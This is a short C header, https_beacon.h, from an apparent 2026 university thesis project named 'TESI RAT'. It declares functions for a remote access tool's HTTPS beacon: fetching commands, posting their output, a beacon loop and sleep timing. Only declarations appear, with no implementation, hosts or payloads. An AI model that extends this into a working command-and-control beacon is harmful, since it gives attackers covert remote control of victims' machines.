/*
 * https_beacon.h
 * Giuseppe Alfonso Mangiola, TESI RAT 2026, DIEM UNISA
 */
#pragma once
#include <windows.h>

char *beacon_get(void);
int   result_post(const char *cmd, const char *output);
void  beacon_loop(void);
DWORD calc_sleep(void);
